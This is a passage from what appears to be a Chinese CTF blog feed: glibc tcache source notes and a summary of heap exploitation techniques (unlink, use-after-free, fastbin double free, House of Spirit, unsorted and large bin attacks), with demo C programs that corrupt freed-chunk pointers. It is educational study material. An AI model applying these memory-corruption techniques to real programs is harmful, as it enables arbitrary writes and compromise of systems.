title="tcache_get()"></a>tcache_get()</h4><p>看一下 <code>tcache_get()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); <span class="comment">// 获得一个 chunk，counts 减一</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>tcache_get()</code> 就是获得 chunk 的过程了。可以看出这个过程还是很简单的，从 <code>tcache-&gt;entries[tc_idx]</code> 中获得第一个 chunk，<code>tcache-&gt;counts</code> 减一，<strong>几乎没有任何保护。</strong></p><h4 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free()"></a>__libc_free()</h4><p>看完申请，再看看<strong>有 tcache 时的释放</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__libc_free()</code> 没有太多变化，**<code>MAYBE_INIT_TCACHE ()</code> 在 tcache 不为空失去了作用**。</p><h4 id="int-free"><a href="#int-free" class="headerlink" title="_int_free()"></a>_int_free()</h4><p>跟进 &#96;_int_free()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="comment">// 64</span></span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// 7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  ......</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure><p>判断 <code>tc_idx</code> 合法，<code>tcache-&gt;counts[tc_idx]</code> 在 7 个以内时，就进入 <code>tcache_put()</code>，传递的两个参数是要释放的 chunk 和该 chunk 对应的 size 在 tcache 中的下标。</p><h4 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put()"></a>tcache_put()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="comment">/* 调用者必须确保我们知道 tc_idx 是有效的，并且还有足够的空间来存放更多的块。 */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];  <span class="comment">//FIFO</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>tcache_puts()</code> 完成了把释放的 chunk 插入到 <code>tcache-&gt;entries[tc_idx]</code> 链表头部的操作，也几乎没有任何保护。并且 <strong>没有把 p 位置零</strong>。(P位是指前一个内存是否分配)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;堆&quot;&gt;&lt;a href=&quot;#堆&quot; class=&quot;headerlink&quot; title=&quot;堆&quot;&gt;&lt;/a&gt;堆&lt;/h2&gt;&lt;p&gt;本篇文章摘自华庭大佬的&lt;code&gt;Glibc 内存管理&lt;/code&gt;一书，只是插入了一些记录&lt;/p&gt;
&lt;h4 id=&quot;什么是堆&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="Pwn知识" scheme="http://s1nec-1o.github.io/categories/Pwn%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆bug利用总结</title>
    <link href="http://s1nec-1o.github.io/2024/02/29/%E5%A0%86bug%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>http://s1nec-1o.github.io/2024/02/29/%E5%A0%86bug%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</id>
    <published>2024-02-29T10:16:03.000Z</published>
    <updated>2024-04-28T14:11:35.660Z</updated>
    
    <content type="html"><![CDATA[<h1 id="All-bug的利用条件，相关检查，相关例子和小手法"><a href="#All-bug的利用条件，相关检查，相关例子和小手法" class="headerlink" title="All bug的利用条件，相关检查，相关例子和小手法"></a>All bug的利用条件，相关检查，相关例子和小手法</h1><p><strong>配合heap bug note食用</strong></p><h2 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h2><h3 id="off-by-one-利用思路"><a href="#off-by-one-利用思路" class="headerlink" title="off-by-one 利用思路"></a>off-by-one 利用思路</h3><ol><li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li><li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</li></ol><h3 id="check"><a href="#check" class="headerlink" title="check"></a>check</h3><p>高版本的unlink：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      <span class="comment">/* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><ol><li>for 循环的边界没有控制好导致写入多执行了一次</li><li>strlen 和 strcpy 的行为不一致却导致了 off-by-one 的发生**。 **strlen 这个函数在计算字符串长度时是不把结束符 <code>\x00</code> 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 <code>\x00</code></li></ol><h2 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><p><strong>ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位。</strong>简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。</p><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><ol><li>对 inuse 的 fastbin 进行 extend</li><li>对 inuse 的 smallbin 进行 extend</li><li>对 free 的 smallbin 进行 extend</li><li>通过 extend 后向 overlapping</li><li>通过 extend 前向 overlapping</li></ol><p>通过<strong>修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping</strong>。</p><h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><p>只有free中的_int_free调用了unlink宏</p><h3 id="check-1"><a href="#check-1" class="headerlink" title="check"></a>check</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               </span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              </span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">              malloc_printerr (check_action,                                      </span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD=P-&gt;fd</span><br><span class="line">BK=P-&gt;bk</span><br><span class="line">FD-&gt;bk = BK</span><br><span class="line">BK-&gt;fd = FD</span><br></pre></td></tr></table></figure><p>将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要</p><ul><li><code>fakeFD -&gt; bk == P</code> &lt;&#x3D;&gt; <code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code> &lt;&#x3D;&gt; <code>*(fakeBK + 8) == P</code></li></ul><p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code> &lt;&#x3D;&gt; <code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code> &lt;&#x3D;&gt; <code>*(fakeBK + 8) = fakeFD</code></li></ul><p><strong>简而言之，unlink实现的效果就使得要unlink的chunk的fd和bk分别所指向的chunk的bk&#x2F;fd发生改变</strong></p><h2 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+-----------------+                       </span><br><span class="line">|   printnote函数  |                       </span><br><span class="line">+-----------------+                       </span><br><span class="line">|   content       |       size              </span><br><span class="line">+-----------------+-------------------&gt;+----------------+</span><br><span class="line">                                       |     real       |</span><br><span class="line">                                       |    content     |</span><br><span class="line">                                       |                |</span><br><span class="line">                                       +----------------+</span><br></pre></td></tr></table></figure><p>这个结构体的real content在free后没有置NULL</p><ul><li>申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li><li>申请 note1，real content size 为 16（<strong>大小与 note 大小所在的 bin 不一样即可</strong>）</li><li>释放 note0</li><li>释放 note1</li><li>此时，<strong>大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0</strong></li><li><strong>申请 note2，并且设置 real content 的大小为 8</strong>，那么根据堆的分配规则</li><li><strong>note2 其实会分配 note1 对应的内存块。</strong></li><li><strong>real content 对应的 chunk 其实是 note0</strong>。</li><li>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。<strong>当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。</strong></li></ul><h2 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h2><h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><ul><li><strong>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞</strong></li><li><strong>漏洞发生于 fastbin 类型的 chunk 中</strong></li></ul><p>如果细分的话，可以做如下的分类：</p><ul><li><strong>Fastbin Double Free</strong></li><li><strong>House of Spirit</strong></li><li><strong>Alloc to Stack</strong></li><li><strong>Arbitrary Alloc</strong></li></ul><p>其中，前两种主要漏洞侧重于利用 <code>free</code> 函数释放<strong>真的 chunk 或伪造的 chunk</strong>，然后再次申请 chunk 进行攻击，后两种侧重于<strong>故意修改 <code>fd</code> 指针</strong>，直接利用 <code>malloc</code> 申请指定位置 chunk 进行攻击。</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。</p><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><h3 id="check-2"><a href="#check-2" class="headerlink" title="check"></a>check</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class="line"><span class="comment">       record we are going to add (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只检查了相邻的两个fastbin是不是一样的</p><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>Fastbin为FIFO机制</p><p>第一次释放<code>free(chunk1)</code></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211358.png" alt="img"></p><p>第二次释放<code>free(chunk2)</code></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211359.png" alt="img"></p><p>第三次释放<code>free(chunk1)</code></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211360.png" alt="img"></p><p>之后malloc一个将chunk1释放出去，然后再修改chunk1的fd内容构造main_arena&#x3D;&gt;chun2&#x3D;&gt;chunk1&#x3D;&gt;target_addr</p><p>但是_int_malloc 会对<strong>欲分配位置的 size 域进行验证</strong>，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常</p><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>fake chunk 的 <strong>ISMMAP 位不能为 1</strong>，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk <strong>地址需要对齐</strong>， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要<strong>满足对应的 fastbin 的需求</strong>，同时也得<strong>对齐</strong>。</li><li>fake chunk 的 **next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>**，同时也不能大于<code>av-&gt;system_mem</code> 。</li><li>fake chunk 对应的 fastbin <strong>链表头部不能是该 fake chunk</strong>，即不能构成 double free 的情况。</li></ul><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p><strong>劫持 fastbin 链表中 chunk 的 fd 指针</strong>，把 fd 指针<strong>指向我们想要分配的栈上</strong>，从而实现控制栈中的一些关键数据，比如返回地址等。</p><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> pre_size;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> size;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> fd;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> bk;</span><br><span class="line">&#125; CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    CHUNK stack_chunk;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *chunk1;</span><br><span class="line">    <span class="type">void</span> *chunk_a;</span><br><span class="line"></span><br><span class="line">    stack_chunk.size=<span class="number">0x21</span>;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)chunk1=&amp;stack_chunk;  <span class="comment">//劫持fd指针</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过该技术我们可以<strong>把 fastbin chunk 分配到栈中</strong>，从而<strong>控制返回地址等关键数据</strong>。要实现这一点我们需要劫持 fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的 size 值。</p><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p><h4 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h4><p>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以<strong>利用字节错位等方法来绕过 size 域的检验</strong>，<strong>实现任意地址分配 chunk</strong>，最后的效果<strong>也就相当于任意地址写任意值</strong>。</p><h2 id="Unsorted-Bin-Attack"><a href="#Unsorted-Bin-Attack" class="headerlink" title="Unsorted Bin Attack"></a>Unsorted Bin Attack</h2><p>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p><strong>初始状态时</strong></p><p>unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。</p><p><strong>执行 free(p)</strong></p><p>由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。</p><p><strong>修改 p[1]</strong></p><p>经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。</p><p><strong>申请 400 大小的 chunk</strong></p><p>此时，所申请的 chunk 处于 small bin 所在的范围，其对应的 bin 中暂时没有 chunk，所以会去 unsorted bin 中找，发现 unsorted bin 不空，于是把 unsorted bin 中的最后一个 chunk 拿出来。</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211361.png" alt="在这里插入图片描述"></p><p>就会变成这样，因为有个条件没有满足，因此unsorted bin链表被破坏，但是target的值被改成了unsorted bin的地址，</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul><li><strong>我们通过修改循环的次数来使得程序可以执行多次循环。</strong></li><li><strong>我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。</strong></li></ul><h2 id="Large-Bin-Attack"><a href="#Large-Bin-Attack" class="headerlink" title="Large Bin Attack"></a>Large Bin Attack</h2><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="comment">// gcc -g -no-pie hollk.c -o hollk</span></span><br><span class="line"> <span class="number">2</span> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="number">3</span> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> <span class="number">4</span> </span><br><span class="line"> <span class="number">5</span> <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line"> 6 &#123;</span><br><span class="line"> <span class="number">7</span> </span><br><span class="line"> <span class="number">8</span>     <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line"> <span class="number">9</span>     <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"><span class="number">10</span> </span><br><span class="line"><span class="number">11</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line"><span class="number">12</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"><span class="number">13</span> </span><br><span class="line"><span class="number">14</span>     <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line"><span class="number">15</span>     <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="number">16</span>     <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"><span class="number">17</span>     <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="number">18</span>     <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"><span class="number">19</span>     <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="number">20</span> </span><br><span class="line"><span class="number">21</span>     <span class="built_in">free</span>(p1);</span><br><span class="line"><span class="number">22</span>     <span class="built_in">free</span>(p2);</span><br><span class="line"><span class="number">23</span> </span><br><span class="line"><span class="number">24</span>     <span class="type">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">25</span> </span><br><span class="line"><span class="number">26</span>     <span class="built_in">free</span>(p3);</span><br><span class="line"><span class="number">27</span> </span><br><span class="line"><span class="number">28</span>     p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line"><span class="number">29</span>     p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="number">30</span>     p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="number">31</span>     p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line"><span class="number">32</span>     p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"><span class="number">33</span> </span><br><span class="line"><span class="number">34</span>     <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">35</span> </span><br><span class="line"><span class="number">36</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line"><span class="number">37</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> 